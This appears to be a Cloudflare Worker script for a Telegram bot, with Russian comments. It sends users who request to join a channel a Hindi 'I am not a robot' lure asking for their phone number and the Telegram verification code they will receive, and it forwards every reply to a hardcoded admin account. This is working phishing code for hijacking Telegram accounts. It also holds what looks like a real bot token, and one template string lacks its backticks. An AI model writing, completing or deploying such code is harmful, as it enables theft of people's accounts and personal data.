addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

const TELEGRAM_TOKEN = '8272096441:AAH9v-kZskTBw_wGoAPvDVyTjSVl44hzHZ8'; // вставь токен бота
const ADMIN_ID = '5142030265';     // вставь свой Telegram ID

async function handleRequest(request) {
  const body = await request.json().catch(() => null)
  if (!body) return new Response('ok', {status:200})

  // 1️⃣ Новая заявка в канал
  if (body.chat_join_request) {
    const userId = body.from.id
    const chatId = userId
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: chatId,
        text: '‼️यह कन्फर्म करने के लिए कि आप रोबोट नहीं हैं, कृपया "मैं रोबोट नहीं हूँ" बटन पर क्लिक करें और अपना फ़ोन नंबर सबमिट करें। अपना फ़ोन नंबर सबमिट करने के बाद, थोड़ा इंतज़ार करें, और आपके टेलीग्राम अकाउंट पर एक वेरिफिकेशन कोड भेजा जाएगा। फिर, इस बॉट में मिले मैसेज के जवाब में यह कोड डालें।‼️',
        reply_markup: {
          inline_keyboard: [[{text: 'Я не робот', callback_data: 'not_robot'}]]
        }
      })
    })
    return new Response('ok', {status:200})
  }

  // 2️⃣ Пересылаем сообщения пользователя админу
  if (body.message && body.message.text) {
    const text = body.message.text
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: Сообщение от ${body.message.from.username || body.message.from.first_name}: ${text}
      })
    })
  }

  return new Response('ok', {status:200})
}
